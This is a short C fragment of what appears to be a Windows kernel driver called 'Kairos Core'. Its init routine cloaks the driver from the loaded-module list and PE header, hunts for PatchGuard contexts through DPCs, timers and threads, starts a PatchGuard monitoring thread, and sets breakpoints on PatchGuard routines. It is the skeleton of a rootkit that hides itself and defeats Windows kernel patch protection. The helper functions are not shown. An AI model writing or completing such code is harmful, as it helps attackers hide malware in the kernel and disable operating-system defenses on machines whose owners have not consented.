VOID InitializeKairosCore() {
    DebugLog(">> Initializing Kairos Core");

    // Step 1: Cloak the driver from PsLoadedModuleList, PE header, etc.
    CloakKairosDriver();

    // Step 2: Setup encrypted patch system
    SetupEncryptedPatchSystem();  // Registers patch locations & vaults

    // Step 3: Find initial PG contexts (via DPC, Timer, Thread)
    FindUniquePatchGuardContexts();

    // Step 4: Set up PG monitoring thread
    HANDLE hThread = NULL;
    PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, PgMonitorThread, NULL);

    // Step 5: Set trap on known PG routine (via DPC or thread trace)
    PVOID pgTarget = LocateDeferredRoutineViaDPC();
    if (pgTarget) SetPgBreakpoint(pgTarget);

    DebugLog("<< Kairos Core Initialized");
}

NTSTATUS MainRoutine() {
    InitializeKairosCore();
    return STATUS_SUCCESS;
}
